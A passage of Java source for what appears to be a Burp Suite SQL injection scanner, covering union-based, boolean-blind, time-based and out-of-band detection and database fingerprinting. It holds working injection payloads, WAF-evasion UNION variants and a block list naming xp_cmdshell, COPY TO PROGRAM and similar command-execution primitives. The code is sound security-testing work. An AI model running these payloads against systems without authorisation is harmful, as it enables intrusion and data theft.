                    } else {
                        // Response changed — previous value was the column count
                        if (lastGood > 0) {
                            columnCount = lastGood;
                            quoteChar = q;
                        }
                        break;
                    }
                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return false;
                }
            }
            if (columnCount > 0) break;
        }

        if (columnCount <= 0) return false;

        // Column count detection is a prerequisite step, not a finding.
        // Only report if UNION marker exfiltration succeeds.

        // Step 2: UNION SELECT with NULLs (try multiple UNION variants)
        try {

            String nulls = String.join(",", Collections.nCopies(columnCount, "NULL"));

            // Try multiple UNION variants — some WAFs block UNION SELECT but allow UNION ALL SELECT
            String[] unionVariants = {
                    " UNION SELECT ",
                    " UNION ALL SELECT ",
                    " UNION/**/SELECT ",
                    " UNION%0aSELECT ",
                    "/*!UNION*//*!SELECT*/ ",
            };

            String unionPayload = null;
            HttpRequestResponse unionResult = null;

            for (String variant : unionVariants) {
                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
                String testPayload = quoteChar.isEmpty()
                        ? ip.originalValue + variant + nulls + "-- -"
                        : ip.originalValue + quoteChar + variant + nulls + "-- -";

                HttpRequestResponse testResult = sendWithPayload(original, ip, testPayload);
                if (testResult != null && testResult.response() != null
                        && ResponseGuard.isUsableResponse(testResult)) {
                    int testStatus = testResult.response().statusCode();
                    // Accept if status is 200 or matches baseline (WAF would return 403/400)
                    if (testStatus == 200 || testStatus == baselineStatus) {
                        unionPayload = testPayload;
                        unionResult = testResult;
                        break;
                    }
                }
                perHostDelay();
            }

            if (unionResult == null) return false;

            String _unionBody = unionResult.response().bodyToString();
            if (_unionBody == null) _unionBody = "";
            // Determine which UNION variant worked for subsequent payloads
            String workingUnion = " UNION SELECT ";
            if (unionPayload != null) {
                for (String variant : unionVariants) {
                    if (unionPayload.contains(variant.trim())) {
                        workingUnion = variant;
                        break;
                    }
                }
            }

            // Step 3: Find reflected column
            int reflectedColumn = -1;
            String unionMarker = "xX" + UUID.randomUUID().toString().replace("-", "").substring(0, 16) + "Xx";
            for (int col = 0; col < columnCount; col++) {
                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;

                String[] cols = new String[columnCount];
                Arrays.fill(cols, "NULL");
                cols[col] = "'" + unionMarker + "'";

                String markerPayload = quoteChar.isEmpty()
                        ? ip.originalValue + workingUnion + String.join(",", cols) + "-- -"
                        : ip.originalValue + quoteChar + workingUnion + String.join(",", cols) + "-- -";

                HttpRequestResponse markerResult = sendWithPayload(original, ip, markerPayload);
                if (markerResult != null && markerResult.response() != null
                        && ResponseGuard.isUsableResponse(markerResult)) {
                    String _markerBody = markerResult.response().bodyToString();
                    if (_markerBody == null) _markerBody = "";
                    if (_markerBody.contains(unionMarker)
                            && !baselineBody.contains(unionMarker)
                            && !looksLikeReflectedUnionPayload(_markerBody, markerPayload, unionMarker)) {
                        reflectedColumn = col + 1;

                        findingsStore.addFinding(Finding.builder("sqli-detector",
                                        "SQL Injection (Union-Based) - Reflected column " + reflectedColumn,
                                        Severity.CRITICAL, Confidence.FIRM)
                                .url(original.request().url())
                                .parameter(ip.name)
                                .evidence("Column " + reflectedColumn + " of " + columnCount + " is reflected. Random marker '" + unionMarker + "' found in response and not reflected from the request.")
                                .payload(markerPayload)
                                .responseEvidence(unionMarker)
                                .description("Union-based SQL injection confirmed. Column " + reflectedColumn
                                        + " is reflected in the response.")
                                .requestResponse(markerResult)
                                .build());

                        // Step 4: DB fingerprinting
                        fingerprintDb(original, ip, columnCount, reflectedColumn, quoteChar, workingUnion);
                        return true;
                    }
                }
                perHostDelay();
            }

            // Anomaly-only detection REMOVED: a response that differs from baseline is not a finding.
            // Only confirmed UNION marker exfiltration constitutes a finding.

        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        return false;
    }

    private boolean testBooleanBased(HttpRequestResponse original, InjectionPoint ip,
                                     HttpRequestResponse baseline) {
        if (baseline == null || baseline.response() == null) return false;
        HttpRequestResponse baseline2 = sendWithPayload(original, ip, ip.originalValue);
        if (baseline2 == null || baseline2.response() == null) return false;

        String baselineShape = responseShape(baseline, ip.originalValue);
        String baselineShape2 = responseShape(baseline2, ip.originalValue);
        if (!baselineShape.equals(baselineShape2)) {
            api.logging().logToOutput("[SQLi] Boolean phase skipped for " + ip.name
                    + " — baseline content is unstable");
            return false;
        }

        String marker = UUID.randomUUID().toString().replace("-", "").substring(0, 10);
        String[][] pairs = {
                {ip.originalValue + "' AND '" + marker + "'='" + marker + "'-- -",
                 ip.originalValue + "' AND '" + marker + "'='x" + marker + "'-- -"},
                {ip.originalValue + " AND 918273=918273-- -",
                 ip.originalValue + " AND 918273=918274-- -"},
                {ip.originalValue + "\" AND \"" + marker + "\"=\"" + marker + "\"-- -",
                 ip.originalValue + "\" AND \"" + marker + "\"=\"x" + marker + "\"-- -"}
        };

        for (String[] pair : pairs) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
            HttpRequestResponse true1 = sendWithPayload(original, ip, pair[0]);
            HttpRequestResponse false1 = sendWithPayload(original, ip, pair[1]);
            if (!booleanCandidate(baseline, baselineShape, true1, false1, pair)) continue;

            HttpRequestResponse true2 = sendWithPayload(original, ip, pair[0]);
            HttpRequestResponse false2 = sendWithPayload(original, ip, pair[1]);
            if (!booleanCandidate(baseline, baselineShape, true2, false2, pair)) continue;
            if (!responseShape(false1, pair[1]).equals(responseShape(false2, pair[1]))) continue;

            findingsStore.addFinding(Finding.builder("sqli-detector",
                            "SQL Injection (Boolean-Based Blind)", Severity.HIGH, Confidence.CERTAIN)
                    .url(original.request().url()).parameter(ip.name)
                    .evidence("True condition matched two stable baselines twice; false condition "
                            + "produced a different, repeatable response twice. True payload: " + pair[0]
                            + " | False payload: " + pair[1])
                    .description("Boolean-based blind SQL injection confirmed through repeated "
                            + "true/false differential responses on a stable endpoint.")
                    .payload(pair[0])
                    .requestResponse(false2)
                    .build());
            return true;
        }
        return false;
    }

    private static boolean booleanCandidate(HttpRequestResponse baseline, String baselineShape,
                                             HttpRequestResponse trueResult,
                                             HttpRequestResponse falseResult, String[] pair) {
        if (trueResult == null || trueResult.response() == null
                || falseResult == null || falseResult.response() == null) return false;
        boolean trueMatches = trueResult.response().statusCode() == baseline.response().statusCode()
                && responseShape(trueResult, pair[0]).equals(baselineShape);
        boolean falseDiffers = falseResult.response().statusCode() != baseline.response().statusCode()
                || !responseShape(falseResult, pair[1]).equals(baselineShape);
        return trueMatches && falseDiffers;
    }

    static String responseShape(HttpRequestResponse result, String reflectedPayload) {
        if (result == null || result.response() == null) return "";
        String body = result.response().bodyToString();
        if (body == null) body = "";
        if (reflectedPayload != null && !reflectedPayload.isEmpty()) {
            body = body.replace(reflectedPayload, "");
        }
        return body
                .replaceAll("(?i)[0-9a-f]{8}-[0-9a-f-]{27,}", "<uuid>")
                .replaceAll("\\b\\d{4,}\\b", "<number>")
                .replaceAll("\\s+", " ")
                .trim();
    }

    static boolean looksLikeReflectedUnionPayload(String body, String payload, String marker) {
        if (body.contains(payload)) return true;
        int markerAt = body.indexOf(marker);
        if (markerAt < 0) return false;
        int start = Math.max(0, markerAt - 200);
        int end = Math.min(body.length(), markerAt + marker.length() + 200);
        String window = body.substring(start, end).toLowerCase(Locale.ROOT);
        return window.contains("union") && window.contains("select");
    }

    private void fingerprintDb(HttpRequestResponse original, InjectionPoint ip,
                                int columnCount, int reflectedCol, String quoteChar, String unionVariant) {
        String[][] dbProbes = {
                {"MySQL", "version()"},
                {"MySQL", "database()"},
                {"MySQL", "user()"},
                {"MySQL", "@@datadir"},
                {"PostgreSQL", "version()"},
                {"PostgreSQL", "current_database()"},
                {"PostgreSQL", "current_user"},
                {"MSSQL", "@@version"},
                {"MSSQL", "DB_NAME()"},
                {"MSSQL", "SYSTEM_USER"},
                {"MSSQL", "@@SERVERNAME"},
                {"Oracle", "banner FROM v$version WHERE ROWNUM=1"},
                {"Oracle", "user FROM dual"},
                {"SQLite", "sqlite_version()"},
        };

        for (String[] probe : dbProbes) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
            try {

                String[] cols = new String[columnCount];
                Arrays.fill(cols, "NULL");
                // Oracle probes with FROM need special handling. Match the exact
                // " FROM " delimiter used by the split below, otherwise a probe
                // containing "FROM " without a leading space would set oracleFrom
                // yet split into a single element, throwing on the [1] access.
                boolean oracleFrom = probe[1].contains(" FROM ");
                if (oracleFrom) {
                    cols[reflectedCol - 1] = probe[1].split(" FROM ")[0];
                } else {
                    cols[reflectedCol - 1] = probe[1];
                }

                String selectPart = String.join(",", cols);
                String fromPart = oracleFrom ? " FROM " + probe[1].split(" FROM ")[1] : "";

                String payload = quoteChar.isEmpty()
                        ? ip.originalValue + unionVariant + selectPart + fromPart + "-- -"
                        : ip.originalValue + quoteChar + unionVariant + selectPart + fromPart + "-- -";

                HttpRequestResponse result = sendWithPayload(original, ip, payload);
                if (result != null && result.response() != null
                        && ResponseGuard.isUsableResponse(result)) {
                    String body = result.response().bodyToString();
                    if (body == null) body = "";
                    // Look only for DB-specific version strings — generic response changes
                    // cannot identify which engine evaluated a shared SQL expression.
                    boolean hasDbVersion = body.contains("MariaDB")
                            || body.contains("PostgreSQL")
                            || body.contains("Microsoft SQL Server")
                            || body.contains("Oracle Database")
                            || body.contains("SQLite")
                            || body.contains("MySQL")
                            || body.contains("CockroachDB")
                            || body.contains("DB2")
                            || body.contains("Firebird");
                    if (hasDbVersion) {
                        // DB fingerprinting is informational context, not a standalone finding.
                        // The UNION injection itself was already reported as CRITICAL.
                        findingsStore.addFinding(Finding.builder("sqli-detector",
                                        "Database Fingerprint: " + probe[0],
                                        Severity.INFO, Confidence.CERTAIN)
                                .url(original.request().url())
                                .parameter(ip.name)
                                .evidence("DB probe " + probe[1] + " returned data")
                                .payload(payload)
                                .description("Database identified as " + probe[0] + " via UNION-based extraction. "
                                        + "This is informational context for the confirmed UNION injection.")
                                .requestResponse(result)
                                .build());
                        return;
                    }
                }
                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    // ==================== PHASE 4: TIME-BASED BLIND ====================

    private void testTimeBased(HttpRequestResponse original, InjectionPoint ip,
                                String detectedDbms) {
        int delayThreshold = config.getInt("sqli.time.threshold", 3000);

        // Step 0: Collect 3 baseline measurements and check stability
        long[] baselines = new long[3];
        for (int i = 0; i < 3; i++) {
            try {
                TimedResult bt = measureResponseTime(original, ip, ip.originalValue);
                baselines[i] = bt.response != null ? bt.elapsedMs : 0;
            } catch (Exception e) {
                return;
            }
        }
        long baselineMax = Math.max(baselines[0], Math.max(baselines[1], baselines[2]));
        double baselineMean = (baselines[0] + baselines[1] + baselines[2]) / 3.0;
        double baselineVariance = 0;
        for (long b : baselines) baselineVariance += (b - baselineMean) * (b - baselineMean);
        double baselineStdDev = Math.sqrt(baselineVariance / 3.0);

        // If baseline is too unstable (stddev > 30% of mean), skip time-based testing
        if (baselineMean > 0 && baselineStdDev / baselineMean > 0.3) {
            api.logging().logToOutput("[SQLi] Skipping time-based for " + ip.name
                    + " — baseline too unstable (mean=" + Math.round(baselineMean)
                    + "ms, stddev=" + Math.round(baselineStdDev) + "ms)");
            return;
        }

        for (Map.Entry<String, String[]> entry : TIME_PAYLOADS.entrySet()) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
            String dbType = entry.getKey();

            // DBMS filtering: if fingerprint identified a DBMS, skip time payloads for other DBMSes
            // (TIME_PAYLOADS has no "Generic" group — all entries are DB-specific)
            if (detectedDbms != null && !dbType.equals(detectedDbms)) {
                continue;
            }
            for (String payload : entry.getValue()) {
                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
                if (isOobConfirmed(original, ip)) return;
                try {
                    // Step 1: Send true-condition delay payload
                    TimedResult result1 = measureResponseTime(original, ip, payload);
                    if (!ResponseGuard.isTimingTrustworthy(result1.response)) continue;

                    if (result1.elapsedMs >= baselineMax + delayThreshold) {
                        // Step 2: Build false-condition payload (replace SLEEP(18) → IF(1=2,SLEEP(18),0) etc.)
                        String falsePayload = buildFalseConditionPayload(payload, dbType);

                        if (falsePayload != null) {
                            TimedResult falseResult = measureResponseTime(original, ip, falsePayload);
                            if (!ResponseGuard.isTimingTrustworthy(falseResult.response)) continue;

                            // False condition must return within baseline range
                            boolean falseInRange = falseResult.elapsedMs <= baselineMax + 1000;

                            if (falseInRange) {
                                // Step 3: Confirm true-condition with a second attempt
                                TimedResult result2 = measureResponseTime(original, ip, payload);
                                if (!ResponseGuard.isTimingTrustworthy(result2.response)) continue;

                                if (result2.elapsedMs >= baselineMax + delayThreshold) {
                                    // All 3 steps passed: baseline stable, true delays, false doesn't
                                    findingsStore.addFinding(Finding.builder("sqli-detector",
                                                    "SQL Injection (Time-Based Blind) - " + dbType,
                                                    Severity.HIGH, Confidence.CERTAIN)
                                            .url(original.request().url())
                                            .parameter(ip.name)
                                            .evidence("Payload: " + payload
                                                    + "\nBaseline max: " + baselineMax + "ms (mean=" + Math.round(baselineMean) + "ms)"
                                                    + "\nTrue condition #1: " + result1.elapsedMs + "ms"
                                                    + "\nFalse condition: " + falseResult.elapsedMs + "ms (payload: " + falsePayload + ")"
                                                    + "\nTrue condition #2: " + result2.elapsedMs + "ms")
                                            .payload(payload)
                                            .description("Time-based blind SQL injection confirmed via 3-step verification. "
                                                    + "True condition delays, false condition does not, baseline is stable. "
                                                    + "DB type: " + dbType)
                                            .requestResponse(result2.response)
                                            .build());
                                    return;
                                }
                            }
                            // If false condition also delays or true doesn't reproduce → inconclusive, discard
                        } else {
                            // No false-condition payload available — require 2 consistent true hits
                            TimedResult result2 = measureResponseTime(original, ip, payload);
                            if (!ResponseGuard.isTimingTrustworthy(result2.response)) continue;
                            if (result2.elapsedMs >= baselineMax + delayThreshold) {
                                findingsStore.addFinding(Finding.builder("sqli-detector",
                                                "SQL Injection (Time-Based Blind) - " + dbType,
                                                Severity.HIGH, Confidence.FIRM)
                                        .url(original.request().url())
                                        .parameter(ip.name)
                                        .evidence("Payload: " + payload
                                                + "\nBaseline max: " + baselineMax + "ms"
                                                + "\nTrue #1: " + result1.elapsedMs + "ms"
                                                + "\nTrue #2: " + result2.elapsedMs + "ms"
                                                + "\n(No false-condition payload available for this DB type)")
                                        .payload(payload)
                                        .description("Time-based blind SQL injection detected (2 consistent hits). "
                                                + "DB type: " + dbType)
                                        .requestResponse(result2.response)
                                        .build());
                                return;
                            }
                        }
                        // Single hit without confirmation → discard (not reported)
                    }
                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
        }
    }

    private String buildFalseConditionPayload(String truePayload, String dbType) {
        if (truePayload.contains("SLEEP(5)") && !truePayload.contains("IF(")) {
            return truePayload.replace("SLEEP(5)", "IF(1=2,SLEEP(5),0)");
        }
        if (truePayload.contains("IF(1=1,SLEEP(5)")) {
            return truePayload.replace("IF(1=1,SLEEP(5)", "IF(1=2,SLEEP(5)");
        }
        if (truePayload.contains("PG_SLEEP(5)") && !truePayload.contains("CASE")) {
            return truePayload.replace("PG_SLEEP(5)", "CASE WHEN 1=2 THEN PG_SLEEP(5) END");
        }
        if (truePayload.contains("WHEN 1=1 THEN")) {
            return truePayload.replace("WHEN 1=1 THEN", "WHEN 1=2 THEN");
        }
        if (truePayload.contains("WAITFOR DELAY") && !truePayload.contains("IF")) {
            return truePayload.replace("WAITFOR DELAY", "IF 1=2 WAITFOR DELAY");
        }
        if (truePayload.contains("IF(1=1) WAITFOR") || truePayload.contains("IF 1=1 WAITFOR")) {
            return truePayload.replace("1=1", "1=2");
        }
        if (truePayload.contains("DBMS_PIPE.RECEIVE_MESSAGE")) {
            if (truePayload.contains("WHEN 1=1")) return truePayload.replace("WHEN 1=1", "WHEN 1=2");
            return truePayload.replace("DBMS_PIPE.RECEIVE_MESSAGE('a',5)", "DBMS_PIPE.RECEIVE_MESSAGE('a',0)");
        }
        if (truePayload.contains("DBMS_LOCK.SLEEP") || truePayload.contains("DBMS_SESSION.SLEEP")) {
            return truePayload.replace("BEGIN", "BEGIN IF 1=2 THEN").replace("END;", "END IF; END;");
        }
        if (truePayload.contains("BENCHMARK(")) {
            return truePayload.replaceFirst("BENCHMARK\\(\\d+", "BENCHMARK(1");
        }
        return null;
    }

    // ==================== PHASE 6: OOB VIA COLLABORATOR ====================

    private void testOob(HttpRequestResponse original, InjectionPoint ip, String detectedDbms,
                         boolean fastStage) {
        String url = original.request().url();

        for (Map.Entry<String, String[]> entry : OOB_PAYLOADS.entrySet()) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
            String dbType = entry.getKey();

            // DBMS filtering: if fingerprint identified a DBMS, skip OOB payloads for other DBMSes
            if (detectedDbms != null && !dbType.equals(detectedDbms)) {
                continue;
            }
            String[] templates = entry.getValue();
            for (int payloadIndex = 0; payloadIndex < templates.length; payloadIndex++) {
                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
                if (isOobConfirmed(original, ip)) return;
                if ((payloadIndex < 2) != fastStage) continue;
                String payloadTemplate = templates[payloadIndex];
                if (!isNonDestructiveOobPayload(payloadTemplate)) continue;
                try {
                    // AtomicReference to capture the sent request/response for the finding
                    AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
                    AtomicReference<String> sentPayload = new AtomicReference<>();

                    // Generate unique Collaborator payload for this test
                    String collabPayload = collaboratorManager.generatePayload(
                            "sqli-detector", url, ip.name,
                            "OOB SQLi (" + dbType + ")",
                            interaction -> {
                                // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
                                // fires on a 5-second interval so this race is rare, but when it happens the 50ms
                                // wait is almost always enough for the sending thread to complete its set() call.
                                for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
                                    try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                                }
                                // Mark parameter as confirmed — skip all remaining phases (HTTP only, DNS continues scanning)
                                if (interaction.type() == InteractionType.HTTP) {
                                    oobConfirmedTargets.add(scanTargetKey(original.request(), ip));
                                }
                                findingsStore.addFinding(Finding.builder("sqli-detector",
                                                "SQL Injection (Out-of-Band) - " + dbType,
                                                Severity.CRITICAL,
                                                interaction.type() == InteractionType.HTTP ? Confidence.CERTAIN : Confidence.FIRM)
                                        .url(url)
                                        .parameter(ip.name)
                                        .evidence("Collaborator " + interaction.type().name()
                                                + " interaction received from " + interaction.clientIp()
                                                + " at " + interaction.timeStamp()
                                                + " | DB type: " + dbType)
                                        .payload(sentPayload.get())
                                        .description("Out-of-band SQL injection confirmed via Burp Collaborator. "
                                                + "The server made a " + interaction.type().name()
                                                + " request to the Collaborator server, proving code execution "
                                                + "within the SQL query. DB type: " + dbType)
                                        .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
                                        .build());
                                api.logging().logToOutput("[SQLi OOB] Confirmed! " + interaction.type()
                                        + " interaction for " + url + " param=" + ip.name + " DB=" + dbType);
                            }
                    );

                    if (collabPayload == null) continue;

                    // Replace placeholder with actual Collaborator domain (DNS-aware for Custom OOB)
                    String payload = resolveSqlOobTemplate(payloadTemplate, collabPayload);
                    if (payload == null) continue;
                    sentPayload.set(payload);


                    HttpRequestResponse oobResult = sendWithPayload(original, ip, payload);
                    sentRequest.set(oobResult);
                    if (oobResult != null && !ResponseGuard.isUsableResponse(oobResult)) { perHostDelay(); continue; }

                    api.logging().logToOutput("[SQLi OOB] Sent " + dbType + " payload to " + url
                            + " param=" + ip.name + " collab=" + collabPayload);

                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                } catch (Exception e) {
                    api.logging().logToError("SQLi OOB error: " + e.getMessage());
                }
            }
        }
    }

    private static boolean isNonDestructiveOobPayload(String payload) {
        String p = payload.toLowerCase(Locale.ROOT);
        return !p.contains("copy (")
                && !p.contains("to program")
                && !p.contains("from program")
                && !p.contains("xp_cmdshell")
                && !p.contains("sp_oacreate")
                && !p.contains("openrowset")
                && !p.contains("bulk insert")
                && !p.contains("lo_export")
                && !p.contains("attach database")
                && !p.contains("load_extension")
                && !p.contains("(select version())")
                && !p.contains("(select user")
                && !p.contains("(select current_user")
                && !p.contains("%computername%")
                && !p.contains("version()")
                && !p.contains("user()");
    }

    private String resolveSqlOobTemplate(String template, String generatedPayload) {
        if (collaboratorManager.getMode() != CollaboratorManager.OobMode.CUSTOM_OOB) {
            return collaboratorManager.resolveTemplate(template, generatedPayload);
        }

        String lower = template.toLowerCase(Locale.ROOT);
        boolean httpTemplate = lower.contains("http://collab_placeholder")
                || lower.contains("https://collab_placeholder");
        boolean shellDnsCommand = lower.contains("nslookup ") || lower.contains("ping ")
                || lower.contains("dig ") || lower.contains("host ")
                || lower.contains("resolve-dnsname");
        if (httpTemplate || shellDnsCommand) {
            return collaboratorManager.resolveTemplate(template, generatedPayload);
        }

        // Native DB callbacks (UNC paths, UTL_INADDR, dblink, LOAD_FILE) require
        // a hostname, not the custom HTTP payload format address:port/id.
        if (!collaboratorManager.isCustomDnsRunning()) return null;
        String address = collaboratorManager.getCustomAddress();
        if (address == null || address.isBlank() || address.contains(":")) return null;
        int slash = generatedPayload.lastIndexOf('/');
        String payloadId = slash >= 0 ? generatedPayload.substring(slash + 1) : generatedPayload;
        return template.replace("COLLAB_PLACEHOLDER", payloadId + "." + address);
    }

    // ==================== DBMS FINGERPRINTING ====================

    /**
     * Attempt to identify the backend DBMS by sending lightweight probes and matching
     * response errors against ERROR_PATTERNS. Results are cached per fully scoped
     * injection target, so one parameter cannot suppress probes for another.
     *
     * @return DBMS name (e.g. "MySQL"), or null if inconclusive / disabled
     */
    private String fingerprintDbms(HttpRequestResponse original, InjectionPoint ip,
                                    String urlPath, String baselineBody) {
        // Error-based SQLi is parameter-specific. Cache only the fully scoped target;
        // caching by URL path skipped every parameter after the first one.
        String fingerprintKey = scanTargetKey(original.request(), ip);
        boolean manualBypass = dedup != null && dedup.isBypass();
        if (manualBypass) {
            fingerprintCache.remove(fingerprintKey);
        }
        String cached = fingerprintCache.get(fingerprintKey);
        if (cached != null) {
            return cached.isEmpty() ? null : cached;
        }

        // Thread coordination: only one thread fingerprints a scoped target at once.
        CountDownLatch newLatch = new CountDownLatch(1);
        CountDownLatch existing = fingerprintLatches.putIfAbsent(fingerprintKey, newLatch);
        if (existing != null) {
            // Another thread is already fingerprinting this path — wait for it
            try {
                existing.await();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return null;
            }
            cached = fingerprintCache.get(fingerprintKey);
            return (cached != null && !cached.isEmpty()) ? cached : null;
        }

        // We won the race — perform fingerprinting
        try {
            FingerprintResult result = runFingerprintProbes(original, ip, baselineBody);

            // Cache the result (empty string = inconclusive)
            fingerprintCache.put(fingerprintKey, result != null ? result.dbms : "");

            if (result != null) {
                api.logging().logToOutput("[SQLi] DBMS fingerprint: " + result.dbms
                        + " (path=" + urlPath + ", param=" + ip.name + ")");

                // Report as INFO finding
                findingsStore.addFinding(Finding.builder("sqli-detector",
                                "DBMS Fingerprint: " + result.dbms,
                                Severity.INFO, Confidence.TENTATIVE)
                        .url(original.request().url())
                        .parameter(ip.name)
                        .description("DBMS fingerprinted as " + result.dbms + " via error-based probes. "
                                + "Subsequent payload phases will be filtered to " + result.dbms
                                + "-specific and generic payloads, reducing request count.")
                        .build());

                // High confidence (2+ DBMS-specific error patterns absent from the
                // baseline) means quote-breaking probes reached the SQL query
                // unsanitized — that is error-based SQL injection, so file it as a
                // vulnerability, not just a fingerprint note.
                if (result.hits >= 2) {
                    findingsStore.addFinding(Finding.builder("sqli-detector",
                                    "Error-Based SQL Injection (" + result.dbms + ")",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(original.request().url())
                            .parameter(ip.name)
                            .description("Error-based SQL injection detected: quote-breaking probes "
                                    + "triggered " + result.hits + " " + result.dbms + "-specific database "
                                    + "error pattern(s) that were absent from the baseline response, "
                                    + "indicating unsanitized input reaches the SQL query.")
                            .evidence(result.evidence)
                            .payload(result.probe)
                            .responseEvidence(result.evidence)
                            .requestResponse(result.response)
                            .remediation("Use parameterized queries / prepared statements. "
                                    + "Do not concatenate user input into SQL strings.")
                            .build());
                }
            } else {
                api.logging().logToOutput("[SQLi] DBMS fingerprint inconclusive"
                        + " (path=" + urlPath + ", param=" + ip.name + ") — all payloads will fire");
            }

            return result != null ? result.dbms : null;
        } finally {
            newLatch.countDown();
            fingerprintLatches.remove(fingerprintKey);
        }
    }

    /**
     * Send fingerprint probes and match responses against ERROR_PATTERNS.
     * Returns the DBMS with the most hits (plus hit count and a sample matched
     * error as evidence), or null if no matches.
     */
    private FingerprintResult runFingerprintProbes(HttpRequestResponse original, InjectionPoint ip,
                                         String baselineBody) {
        Map<String, DbmsHit> hits = new LinkedHashMap<>();

        for (int i = 0; i < FINGERPRINT_PROBES.length; i++) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return null;
            String probe = FINGERPRINT_PROBES[i];

            try {
                HttpRequestResponse result = sendWithPayload(original, ip, probe);
                if (result == null || result.response() == null) continue;
                if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

                int statusCode = result.response().statusCode();
                String responseBody = result.response().bodyToString();
                if (responseBody == null) responseBody = "";

                // Match response against DBMS-specific error patterns (skip "Generic")
                for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
                    String dbms = entry.getKey();
                    if ("Generic".equals(dbms)) continue;

                    for (Pattern pattern : entry.getValue()) {
                        // Only count if pattern matches response but NOT baseline
                        Matcher matcher = pattern.matcher(responseBody);
                        if (matcher.find()
                                && (baselineBody == null || !pattern.matcher(baselineBody).find())) {
                            DbmsHit hit = hits.computeIfAbsent(dbms, k -> new DbmsHit());
                            hit.count++;
                            if (hit.evidence == null) {
                                String ev = matcher.group();
                                hit.evidence = ev.length() > 200 ? ev.substring(0, 200) + "..." : ev;
                                hit.probe = probe;
                                hit.response = result;
                            }
                        }
                    }
                }

                // Smart early exit: if the universal probe (') alone matched 2+ patterns
                // for one DBMS, we have high confidence — return immediately (1 request)
                if (i == 0) {
                    for (Map.Entry<String, DbmsHit> h : hits.entrySet()) {
                        if (h.getValue().count >= 2) {
                            return new FingerprintResult(h.getKey(), h.getValue());
                        }
                    }
                    // If ' produced no patterns and status != 500, the app likely doesn't
                    // reflect SQL errors — bail out early to save requests
                    if (hits.isEmpty() && statusCode != 500) {
                        return null;
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return null;
            }
        }

        // Return the DBMS with the most hits (if any)
        if (hits.isEmpty()) return null;

        return hits.entrySet().stream()
                .max((a, b) -> Integer.compare(a.getValue().count, b.getValue().count))
                .map(e -> new FingerprintResult(e.getKey(), e.getValue()))
                .orElse(null);
    }

    /** Accumulated error-pattern hits for one DBMS during fingerprinting. */
    private static class DbmsHit {
        int count;
        String evidence;            // first matched error string (truncated to 200 chars)
        String probe;               // probe payload that produced the first hit
        HttpRequestResponse response; // probe response containing the first hit
    }

    /** Fingerprint outcome: the winning DBMS plus the hit data supporting it. */
    private static class FingerprintResult {
        final String dbms;
        final int hits;
        final String evidence;
        final String probe;
        final HttpRequestResponse response;

        FingerprintResult(String dbms, DbmsHit hit) {
            this.dbms = dbms;
            this.hits = hit.count;
            this.evidence = hit.evidence;
            this.probe = hit.probe;
            this.response = hit.response;
        }
    }

    // ==================== HELPER METHODS ====================

    private HttpRequestResponse sendWithPayload(HttpRequestResponse original, InjectionPoint ip, String payload) {
        if (com.omnistrike.framework.ScanState.isCancelled()) return null;
        try {
            HttpRequest modified = injectPayload(original.request(), ip, payload);
            return StepperHttp.sendRequest(modified);
        } catch (Exception e) {
            api.logging().logToError("Failed to send request: " + e.getMessage());
            return null;
        }
    }

    /** Result of a timed request, bundling elapsed time and the response together to avoid races. */
    private static class TimedResult {
        final long elapsedMs;
        final HttpRequestResponse response;
        TimedResult(long elapsedMs, HttpRequestResponse response) {
            this.elapsedMs = elapsedMs;
            this.response = response;
        }
    }

    private TimedResult measureResponseTime(HttpRequestResponse original, InjectionPoint ip, String payload) {
        long start = System.currentTimeMillis();
        HttpRequestResponse response = sendWithPayload(original, ip, payload);
        long elapsed = System.currentTimeMillis() - start;
        return new TimedResult(elapsed, response);
    }

    private HttpRequest injectPayload(HttpRequest request, InjectionPoint ip, String payload) {
        switch (ip.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        burp.api.montoya.http.message.params.HttpParameter.urlParameter(ip.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        burp.api.montoya.http.message.params.HttpParameter.bodyParameter(ip.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, ip.name, payload);
            case JSON:
                return request.withBody(JsonScanSupport.replaceValue(
                        request.bodyToString(), ip.jsonPath, payload));
            case XML:
                String xmlBody = request.bodyToString();
                String xmlEscaped = payload.replace("&", "&amp;").replace("<", "&lt;")
                        .replace(">", "&gt;").replace("\"", "&quot;");
                String newXml;
                if (ip.name.startsWith("@")) {
                    // Attribute injection — replace attribute value
                    String attrName = ip.name.substring(1);
                    newXml = xmlBody.replaceFirst(
                            Pattern.quote(attrName) + "\\s*=\\s*\"" + Pattern.quote(ip.originalValue) + "\"",
                            Matcher.quoteReplacement(attrName + "=\"" + xmlEscaped + "\""));
                } else {
                    // Element text injection — replace text between tags
                    newXml = xmlBody.replaceFirst(
